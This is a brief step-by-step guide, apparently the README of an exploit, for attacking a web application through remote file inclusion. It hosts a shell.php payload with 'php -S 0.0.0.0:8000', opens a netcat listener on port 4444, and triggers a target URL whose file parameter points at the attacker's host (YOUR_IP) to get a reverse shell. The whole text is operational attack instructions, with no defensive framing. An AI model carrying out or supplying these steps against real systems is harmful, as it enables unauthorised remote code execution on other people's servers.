In the same folder, save the payload as payload.txt

In the same folder run 'php -S 0.0.0.0:8000' to host payload
Payload is hosted at 'http://YOUR_IP:8000/shell.php' 

Setup Netcat listener by using 'nc -lvnp 4444'

Then trigger RFI payload on target 'http://webapp.com/get.php?file=http://YOUR_IP:8000/shell.php'

Once triggered, you should see a connection pop up on your listener

NOTE: Remember to change YOUR_IP on both the script and also your terminal. Change to your actual IP
You can find your IP by using the 'ip a' command
